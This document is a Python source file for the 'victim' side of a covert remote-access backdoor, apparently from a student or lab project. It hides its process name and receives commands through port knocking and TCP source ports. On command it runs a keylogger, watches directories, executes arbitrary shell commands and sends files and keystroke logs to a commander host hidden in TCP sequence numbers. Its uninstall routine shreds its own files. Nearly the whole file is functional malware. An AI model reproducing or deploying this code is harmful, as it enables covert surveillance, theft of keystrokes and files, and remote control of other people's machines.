import setproctitle
import os
import subprocess as sp
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from observe import MyHandler
import time
from config import ENCRYPTION_KEY
test = None
test = input("Press Enter To Hide Victim")

if test is not None:
    #Hide the python script process by changing the name of the process to the line below
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    setproctitle.setproctitle(commandResult)
    print(f"Process hidden as {commandResult}")

import sys
import getopt
import socket
import os
import select
from keylogger import Keylogger
from threading import Thread
from threading import Lock
from threading import Event
from scapy.all import sniff, IP, TCP

running = True
running_lock = Lock()
password = [10000, 12000, 13000]
first_port = False
second_port = False
third_port = False
knock_count = 0
stop_event = Event()
commander_msg = ""
raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
received_transfer_data = []
authenticate = True
file_name = ""
commander_addr = None
knock_flag = False

commander_command = ""

def receive_file_name(packet):
    """
    This function receives a packet and extracts the file name information
    encrypted within the packet. The file name is reconstructed character
    by character using a simple encryption and added to the global variable
    'file_name'. The decrypted file name is printed for debugging purposes.

    :param packet: The packet containing the encrypted file name information.
    """
    global file_name

    # Check if the packet contains TCP protocol and is destined to port 8686
    if TCP in packet and packet[TCP].dport == 8686:
        # Extract the encrypted character from the source port of the TCP packet
        encrypted_char = chr(packet[TCP].sport)

        # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
        key = sum(ord(char) for char in ENCRYPTION_KEY)

        # Decrypt the character using the calculated key
        decrypted_char = decrypt_char(encrypted_char, key)

        # Append the decrypted character to the global file_name variable
        file_name += decrypted_char

        # Print the current state of the reconstructed file name for debugging
        print(file_name)


def process_information(packet):
    """
    This function processes a network packet, checking for TCP packets
    destined for port 8585. It extracts the hidden sequence number from
    the TCP header, converts it to bytes, and decrypts it using a key
    calculated from the ASCII values of characters in ENCRYPTION_KEY.
    The decrypted chunk is converted to a string and appended to the
    global variable 'received_transfer_data'.

    :param packet: The network packet containing information to be processed.
    """
    global received_transfer_data

    # Check if the packet contains TCP protocol and is destined to port 8585
    if TCP in packet and packet[TCP].dport == 8585:
        # Extract the hidden sequence number from the TCP header
        hidden = packet[TCP].seq % (2**32)

        # Convert the sequence number to bytes
        data_bytes = hidden.to_bytes(4, byteorder='big')

        # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
        key = sum(ord(char) for char in ENCRYPTION_KEY)

        # Decrypt the chunk using the calculated key
        decrypted_chunk = decrypt_chunk(data_bytes, key)

        # Convert the decrypted bytes to string, ignoring errors and removing null characters
        data_str = decrypted_chunk.decode('utf-8', errors='ignore').replace('\x00', '')

        # Append the decrypted data to the global variable received_transfer_data
        received_transfer_data.append(data_str)

def stop_sniffing_commands(packet):
    """
    This function examines a network packet and checks for specific
    stop-sniffing commands. It decrypts an encrypted character from the
    source port of the TCP packet using a key calculated from the ASCII
    values of characters in ENCRYPTION_KEY. If the decrypted character
    is "?" or "|", the function returns True, indicating a stop command.

    :param packet: The network packet containing command information.
    :return: True if the stop command is detected, otherwise False.
    """
    
    if TCP in packet:
        # Extract the encrypted character from the source port of the TCP packet
        encrypted_char = chr(packet[TCP].sport)

        # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
        key = sum(ord(char) for char in ENCRYPTION_KEY)

        # Decrypt the character using the calculated key
        decrypted_char = decrypt_char(encrypted_char, key)

        # Check if the decrypted character is a stop command ("?" or "|")
        if decrypted_char == "?" or decrypted_char == "|":
            return True

        
def decrypt_char(encrypted_char, key):
    decrypted_char = chr(ord(encrypted_char) ^ key)
    return decrypted_char

def decrypt_chunk(encrypted_chunk, key):
    decrypted_chunk = bytes([(byte ^ key) % 256 for byte in encrypted_chunk])
    return decrypted_chunk

def commands(packet):
    """
    This function processes a network packet, specifically looking for TCP
    packets destined for port 8888. It extracts an encrypted character from
    the source port of the TCP packet, decrypts it using a key calculated
    from the ASCII values of characters in ENCRYPTION_KEY, and appends the
    decrypted character to the global variable 'commander_msg'. 

    :param packet: The network packet containing command information.
    """
    global commander_msg

    # Check if the packet contains TCP protocol and is destined to port 8888
    if TCP in packet and packet[TCP].dport == 8888:
        # Extract the encrypted character from the source port of the TCP packet
        encrypted_char = chr(packet[TCP].sport)

        # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
        key = sum(ord(char) for char in ENCRYPTION_KEY)

        # Decrypt the character using the calculated key
        decrypted_char = decrypt_char(encrypted_char, key)

        # Append the decrypted character to the global variable 'commander_msg'
        commander_msg += decrypted_char

        # Print the current state of the reconstructed message for debugging
        print(commander_msg)

        
def receive_knock(packet):
    """
    This function monitors incoming TCP packets to detect a sequence of port
    knocks. The knocks are defined by the values in the 'password' list,
    and the function updates the 'knock_count' variable accordingly. When
    the correct sequence is detected, it sets 'authenticate' to False.

    :param packet: The network packet containing port information.
    """
    global knock_count
    global authenticate

    # Check if the packet contains TCP protocol
    if TCP in packet:
        # Check for the first knock
        if packet[TCP].dport == password[0] and knock_count == 0:
            print("First Knock Established")
            knock_count += 1
        # Check for the second knock
        elif packet[TCP].dport == password[1] and knock_count == 1:
            print("Second Knock Established")
            knock_count += 1
        # Check for the final knock
        elif packet[TCP].dport == password[2] and knock_count == 2:
            print("Final Knock Established")
            authenticate = False
            knock_count += 1

            
def stop_knock(packet):
    global knock_count
    global commander_addr
    global knock_flag
    if knock_count == 3:
        print(f"Connection to Commander {commander_addr} Has Been Established")
        knock_flag = True
        return True

def observer_thread(path, addr):
    """This method is used by the victim to watch a file/directory for file events

    such as files added, files modified, and files deleted. It is ran in a seperate thread
    so that the victim can still function while it is running.


    Args:
        path (str): The path to observe
        client_socket (socket.socket()): The socket to send the files to
    """
    # Initialize a new Observer object
    observer = Observer()
    # Initialize a MyHandler object with the path and socket as the parameters
    handler = MyHandler(path, addr)

    # Checks if the path is a directory, if it is then recursively check the directory for file events
    if os.path.isdir(path):
        observer.schedule(handler, path, recursive=True)
        print("Watching: ", path) 
    # If the path is a file, then recursion is not needed
    else:
        observer.schedule(handler, os.path.dirname(path), recursive=False)
    
    # Start the observer
    observer.start()

    try:
        while not stop_event.is_set():
            # This ensures that the CPU resources aren't wasted, since it would attempt to 
            # check for file events thousands of times in a second
            handler.send_next_file()
            time.sleep(2)
    finally:
        print("Stopped observer")
        # Stop the observer and let it end gracefully
        observer.stop()
        observer.join()

def escalate_privileges():
    """This method is used to renenact the escalation of privledges. This method doesn't
       actually matter since we are running the script as root.


    Raises:

        OSError: If the user does not have root access, throw a error
        OSError: If the PUID or GUID of the script can't be set to root for some other reason throw

                 a error
    """
    try:
        # Set PUID to 0
        os.setuid(0)
        # Set GUID to 0
        os.setgid(0)
    except OSError as e:
        if e.errno == errno.EPERM:
            raise OSError("Operation not permitted: You need superuser privileges to change UID/GID.")
        else:
            raise OSError(f"Failed to set UID/GID: {os.strerror(e.errno)}")
        
def covert_file(file_path, dest_ip, dest_port):
    with open(file_path, "rb") as file:
        while True:
            chunk = file.read(4) 
            if not chunk or chunk == '':
                break
            if len(chunk) < 4:
                chunk = chunk.ljust(4, b'\x00')
            key = sum(ord(char) for char in ENCRYPTION_KEY)
            encrypted_chunk = encrypt_chunk(chunk, key)
            hidden = int.from_bytes(encrypted_chunk, byteorder='big') % (2**32)
            packet = IP(dst=dest_ip) / TCP(dport=dest_port, seq=hidden)
            packet_bytes = bytes(packet)
            time.sleep(0.5)
            raw_socket.sendto(packet_bytes, (dest_ip, 0))
            
def encrypt_chunk(chunk, key):
    encrypted_chunk = bytes([(byte ^ key) % 256 for byte in chunk])
    return encrypted_chunk
    
def encrypt_char(char, key):
    encrypted_char = chr(ord(char) ^ key)
    return encrypted_char

def receive_command(packet):
    global commander_command
    if TCP in packet and packet[TCP].dport == 8556:
        encrypted_char = chr(packet[TCP].sport)
        key = sum(ord(char) for char in ENCRYPTION_KEY)
        decrypted_char = decrypt_char(encrypted_char, key)
        
        commander_command += decrypted_char
        
def stop_receiving_command(packet):

    if TCP in packet: 
        encrypted_char = chr(packet[TCP].sport)
        key = sum(ord(char) for char in ENCRYPTION_KEY)
        decrypted_char = decrypt_char(encrypted_char, key)
        
        if decrypted_char == "~":
            return True

def main(argv):
    """_summary_

    Args:
        argv (list[str]): A list of all of the command line arguments provided

    """
    # Escalate the privledges of the script
    escalate_privileges()
    
    worker_thread = None
    observe_thread = None
    run_victim = True
    
    key = sum(ord(char) for char in ENCRYPTION_KEY)
    
    global commander_addr
    
    try:
        opts, args = getopt.getopt(argv, "c:")
    except getopt.GetoptError:
        print("Invalid options. Usage: script.py -c <commander addr>")
        
    for opt, arg in opts:
        if opt == "-c":
            commander_addr = arg
    
    # Set and bind the victim socket
    
    # A thread for the keylogger
    worker_thread = None
    thread_created = False
    
    # A keylogger class object
    keylogger = Keylogger(True, "log.txt")
    
    global commander_msg
    global received_transfer_data
    global file_name
    global knock_count
    global knock_flag
    
    
    try:
        
        while True:
            print("Awaiting Port Knock from a Commander...")
            knock_count = 0
            sniff(filter=f"tcp and src host {commander_addr}", prn=receive_knock, stop_filter=stop_knock, store=0, timeout=10)
            time.sleep(1)
            packet = IP(dst=commander_addr) / TCP(sport=ord("|"), dport=8888)
            raw_socket.sendto(bytes(packet), (commander_addr, 0))
            time.sleep(0.5)
        
            while run_victim:
                if not knock_flag:
                    break
                
                knock_count = 0
                commander_msg = ""
                print("Sniffing For Command Packets")
                sniff(filter=f"tcp and src host {commander_addr}", prn=commands, stop_filter=stop_sniffing_commands, store=0)
                print("Sniffed a Command's Packets")
                # If the commander wants to start the keylogger on the victim
                if commander_msg == "STARTKEY?":
                    if not thread_created:
                        print("Starting Keylogger")
                        # Create a new thread that runs the keylogger method and start it
                        worker_thread = Thread(target=keylogger.key_logger)
                        worker_thread.start()
                        # This boolean will ensure only one thread is created by the victim

                        thread_created = True
                        commander_msg = ""
                
                # If the commander wants to stop the keylogger
                elif commander_msg == "STOPKEY?":
                    keylogger.stop_logger()
                    # Ensures that we can create a new thread when the logger is restarted
                    thread_created = False
                    
                    # Ensure that all threads are closed before the log file is closed
                    if worker_thread: 
                        worker_thread.join()
                    print("Stopped Logging")
                        
                    commander_msg = ""
                
                # If the commander wants to transfer the keylogger to itself
                elif commander_msg == "TRANSFERLOG?":
                    # Read the contents of the keylog
                    
                    print("Sending Log file")
                    time.sleep(1)
                    covert_file(keylogger.key_log, commander_addr, 8005) 
                    time.sleep(0.5)
                    packet = IP(dst=commander_addr) / TCP(sport=ord(encrypt_char("|", key)), dport=8005)
                    raw_socket.sendto(bytes(packet), (commander_addr, 0))
                    # Delete the log file from the victim
                    try:
                        os.remove(keylogger.key_log)
                        
                    except OSError as e:
                        print(f"Error: {e}")
                
                elif commander_msg == "WATCHFILE?":
                    stop_event.clear()
                    
                    time.sleep(0.5)
                    sniff(filter=f"tcp and src host {commander_addr}", prn=receive_file_name, stop_filter=stop_sniffing_commands, store=0)
                    file_name = file_name.split("|")
                    full_path = os.path.abspath(file_name[0])
                    print("Started File Watcher")
                    file_name = ""
                    if os.path.exists(full_path):
                        observe_thread = Thread(target=observer_thread, args=(full_path, commander_addr))
                        observe_thread.start()
                    else:
                        print("Directory/File Does Not Exist")
                                
                elif commander_msg == "STOPWATCHFILE?":
                    # Stop the loop in the file/directory watcher thread
                    stop_event.set()
                    time.sleep(1.25)
                    packet = IP(dst=commander_addr) / TCP(sport=ord(encrypt_char("|", key)), dport=7006)
                    raw_socket.sendto(bytes(packet), (commander_addr, 0))
                    time.sleep(1.25)
                    packet = IP(dst=commander_addr) / TCP(sport=ord(encrypt_char("|", key)), dport=7006)
                    raw_socket.sendto(bytes(packet), (commander_addr, 0))
                    time.sleep(1.25)
                    packet = IP(dst=commander_addr) / TCP(sport=ord(encrypt_char("|", key)), dport=7006)
                    raw_socket.sendto(bytes(packet), (commander_addr, 0))
                    time.sleep(1.25)
                
                elif commander_msg == "TRANSFERTO?":
                    global received_transfer_data
                    print("Receiving file")
                    sniff(filter=f"tcp and src host {commander_addr}", prn=receive_file_name, stop_filter=stop_sniffing_commands)
                    sniff(filter=f"tcp and src host {commander_addr}", prn=process_information, stop_filter=stop_sniffing_commands)
                    full_data = ''.join(received_transfer_data)
                    
                    file_name = file_name.split("|")
                    
                    with open(file_name[0], "w") as file:
                        file.write(full_data)
                        
                    file_name = ""
                    received_transfer_data = []
                
                elif commander_msg == "TRANSFERFROM?":
                    print("Sending file to commander")
                    sniff(filter=f"tcp and src host {commander_addr}", prn=receive_file_name, stop_filter=stop_sniffing_commands)
                    file_name = file_name.split("|")
                    time.sleep(0.5)
                    covert_file(file_name[0], commander_addr, 8006)
                    time.sleep(0.5)
                    packet = IP(dst=commander_addr) / TCP(sport=ord(encrypt_char("|", key)), dport = 8006)
                    raw_socket.sendto(bytes(packet), (commander_addr,0))
                    
                elif commander_msg == "RUNCOMMAND?":
                    global commander_command
                    print("Running a command for the commander")
                    sniff(filter=f"tcp and src host {commander_addr}", prn=receive_command, stop_filter=stop_receiving_command, store=0)
                    commander_command = commander_command.split("~")
                    
                    print(commander_command)
                    
                    activate = os.popen(commander_command[0])
                    result = activate.read()
                    commander_command = ""
                    
                    with open("temp.txt", "w") as file:
                        file.write(result)
                    
                    time.sleep(0.5)
                    covert_file("temp.txt", commander_addr, 8556)
                    time.sleep(0.5)
                    
                    os.remove("temp.txt")
                    
                    packet = IP(dst=commander_addr) / TCP(sport=ord(encrypt_char("~", key)), dport = 8556)
                    raw_socket.sendto(bytes(packet), (commander_addr,0))
                    
                elif commander_msg == "UNINSTALL?":
                    print("Uninstalling Victim Backdoor")
                    
                    self_path = os.path.abspath(__file__)

                    # Get the active directory 
                    dir = os.getcwd()

                    # Delete other files
                    sp.call(["rm", dir + "/keylogger.py"])
                    sp.call(["rm", dir + "/observe.py"])
                    sp.call(["rm", dir + "/config.py"])

                    # At the end of the script, the file shreds itself
                    sp.call(["/usr/bin/shred", "-fuz" , self_path])
                    
                    stop_event.set()
                    
                    # Ensures that we can create a new thread when the logger is restarted
                    thread_created = False
                    
                    # Ensure that all threads are closed before the log file is closed
                    if worker_thread: 
                        keylogger.stop_logger()
                        worker_thread.join()
                        
                    sys.exit(2)
                
                elif commander_msg == "DISCONNECT?":
                    knock_flag = False
                    break
                
    except KeyboardInterrupt:
        run_victim = False
        sys.exit(2)
           
if __name__ == "__main__":
    main(sys.argv[1:])
